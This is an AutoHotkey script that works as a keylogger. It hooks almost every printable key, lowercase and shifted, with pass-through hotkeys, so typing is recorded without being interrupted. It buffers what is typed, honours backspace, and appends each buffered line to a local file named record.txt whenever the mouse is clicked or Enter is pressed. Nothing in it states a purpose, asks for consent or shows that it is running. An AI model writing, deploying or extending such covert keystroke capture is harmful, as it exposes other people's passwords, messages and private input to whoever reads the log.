#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

record := FileOpen("record.txt", "w")
record.close()
output := ""

~LButton::
~Enter::
  if (output <> "") {
  record := FileOpen("record.txt", "a")
  if !IsObject(record)
    Return
  record.Write(output . "¬`r`n`r`n")
  record.Close()
  output := ""
  }
Return

~Backspace::
  StringTrimRight, output, output, 1
Return

~!::
  output .= "{!}"
Return

~"::
  output .= """"
Return

~#::
  output .= "#"
Return

~$::
  output .= "$"
Return

~%::
  output .= "%"
Return

~&::
  output .= "&"
Return

~'::
  output .= "'"
Return

~(::
  output .= "("
Return

~)::
  output .= ")"
Return

~*::
  output .= "*"
Return

~+::
  output .= "+"
Return

~,::
  output .= ","
Return

~-::
  output .= "-"
Return

~.::
  output .= "."
Return

~/::
  output .= "/"
Return

~0::
  output .= "0"
Return

~1::
  output .= "1"
Return

~2::
  output .= "2"
Return

~3::
  output .= "3"
Return

~4::
  output .= "4"
Return

~5::
  output .= "5"
Return

~6::
  output .= "6"
Return

~7::
  output .= "7"
Return

~8::
  output .= "8"
Return

~9::
  output .= "9"
Return

~:::
  output .= ":"
Return

~;::
  output .= ";"
Return

~<::
  output .= "<"
Return

~=::
  output .= "="
Return

~>::
  output .= ">"
Return

~?::
  output .= "?"
Return

~@::
  output .= "@"
Return

~+A::
  output .= "A"
Return

~+B::
  output .= "B"
Return

~+C::
  output .= "C"
Return

~+D::
  output .= "D"
Return

~+E::
  output .= "E"
Return

~+F::
  output .= "F"
Return

~+G::
  output .= "G"
Return

~+H::
  output .= "H"
Return

~+I::
  output .= "I"
Return

~+J::
  output .= "J"
Return

~+K::
  output .= "K"
Return

~+L::
  output .= "L"
Return

~+M::
  output .= "M"
Return

~+N::
  output .= "N"
Return

~+O::
  output .= "O"
Return

~+P::
  output .= "P"
Return

~+Q::
  output .= "Q"
Return

~+R::
  output .= "R"
Return

~+S::
  output .= "S"
Return

~+T::
  output .= "T"
Return

~+U::
  output .= "U"
Return

~+V::
  output .= "V"
Return

~+W::
  output .= "W"
Return

~+X::
  output .= "X"
Return

~+Y::
  output .= "Y"
Return

~+Z::
  output .= "Z"
Return

~[::
  output .= "["
Return

~\::
  output .= "\"
Return

~]::
  output .= "]"
Return

~^::
  output .= "^"
Return

~_::
  output .= "_"
Return

~`::
  output .= "`"
Return

~a::
  output .= "a"
Return

~b::
  output .= "b"
Return

~c::
  output .= "c"
Return

~d::
  output .= "d"
Return

~e::
  output .= "e"
Return

~f::
  output .= "f"
Return

~g::
  output .= "g"
Return

~h::
  output .= "h"
Return

~i::
  output .= "i"
Return

~j::
  output .= "j"
Return

~k::
  output .= "k"
Return

~l::
  output .= "l"
Return

~m::
  output .= "m"
Return

~n::
  output .= "n"
Return

~o::
  output .= "o"
Return

~p::
  output .= "p"
Return

~q::
  output .= "q"
Return

~r::
  output .= "r"
Return

~s::
  output .= "s"
Return

~t::
  output .= "t"
Return

~u::
  output .= "u"
Return

~v::
  output .= "v"
Return

~w::
  output .= "w"
Return

~x::
  output .= "x"
Return

~y::
  output .= "y"
Return

~z::
  output .= "z"
Return

~{::
  output .= "{"
Return

~|::
  output .= "|"
Return

~}::
  output .= "}"
Return

~~::
  output .= "~"
Return

